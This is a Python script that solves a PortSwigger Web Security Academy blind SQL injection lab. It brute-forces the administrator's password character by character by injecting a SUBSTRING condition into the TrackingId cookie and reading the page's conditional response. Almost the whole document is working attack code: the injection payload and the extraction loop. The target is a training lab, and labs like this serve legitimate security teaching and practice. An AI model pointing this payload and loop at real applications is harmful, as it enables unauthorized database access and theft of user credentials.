#!/bin/python3
# A Simple and in-efficient brute-force algorithm to find out the password.
# To be used in a BlindSQLi Based on Conditional Response Lab By PortSwigger
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# To-do: Learn DSA and Maybe Improve This Crap
# Worst Case: You have to wait ((number_of_characters*length_of_password)/60 + (req,res time) + 20 seconds) seconds

import requests, sys, time
from bs4 import BeautifulSoup

TARGET_URL = "https://0a5d003e03963491966453e7009200cc.web-security-academy.net/"

length_of_password = 20  # Adjust this according to your findings on size of password

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
}

# Adjust number of empty "" according to your findings on size of password
password = [
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
]
characters = [
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    0,
    "A",
    "B",
    "C",
    "D",
    "E",
    "F",
    "G",
    "H",
    "I",
    "J",
    "K",
    "L",
    "M",
    "N",
    "O",
    "P",
    "Q",
    "R",
    "S",
    "T",
    "U",
    "V",
    "W",
    "X",
    "Y",
    "Z",
]

print("\n[*] Starting BlindSQLi Script")

for char in characters:
    for i in range(length_of_password):
        if password.__contains__(""):
            pass
        else:
            print("\n[+] Done Injecting")
            print(password)
            sys.exit(1)

        print("\n[*] Checking Against Position: {} and Char: {}".format(i + 1, char))

        cookie = {
            "TrackingId": "qBNQcv74jBCkrEpX' AND (SELECT SUBSTRING(password, {}, 1) FROM users WHERE username = 'administrator') = '{}'--".format(
                i + 1, char
            )
        }
        response = requests.get(TARGET_URL, cookies=cookie, headers=header)
        soup = BeautifulSoup(response.content, "html5lib")
        top_link_section = soup.find("section", attrs={"class": "top-links"})
        div = top_link_section.find("div")
        if div:
            print("[+] Char: {} is True at Position: {}".format(char, i + 1))
            password[i] = char

            print("[+] Password at this point: {}".format(password))
            time.sleep(1)
        else:
            print("[-] Char: {} is Not True at Position: {}".format(char, i + 1))


print("\n[+] Done Injecting")
print(password)
